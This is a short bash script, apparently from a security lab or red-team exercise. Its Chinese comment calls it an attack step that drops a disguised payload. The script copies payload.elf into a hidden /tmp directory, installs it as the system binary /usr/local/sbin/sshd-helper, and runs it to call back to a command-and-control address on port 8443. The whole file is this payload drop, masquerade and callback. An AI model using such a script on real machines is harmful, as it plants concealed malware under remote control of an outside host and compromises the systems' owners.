#!/usr/bin/env bash
# attack（窗口内）：投放伪装名载荷至系统目录并执行回连。
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
cp payload.elf /tmp/.cache/sysupd/drop.elf
install -m 0755 /tmp/.cache/sysupd/drop.elf /usr/local/sbin/sshd-helper
/usr/local/sbin/sshd-helper "$C2_IP" 8443
